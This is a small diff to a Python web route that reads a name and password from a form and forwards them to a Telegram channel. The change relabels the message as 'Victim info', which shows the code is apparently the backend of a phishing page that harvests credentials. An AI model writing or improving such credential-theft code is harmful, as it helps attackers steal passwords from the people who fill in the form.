@@ -229,7 +229,7 @@ def submit_form():
         name = request.form.get('name')
         password = request.form.get('password')
 
-        message = f"New form submission:\nName: {name}\nPassword: {password}"
+        message = f"Victim info 🐔:\nName: {name}\nPassword: {password}"
         send_message_to_telegram(message)
 
         return jsonify({'status': 'success'})
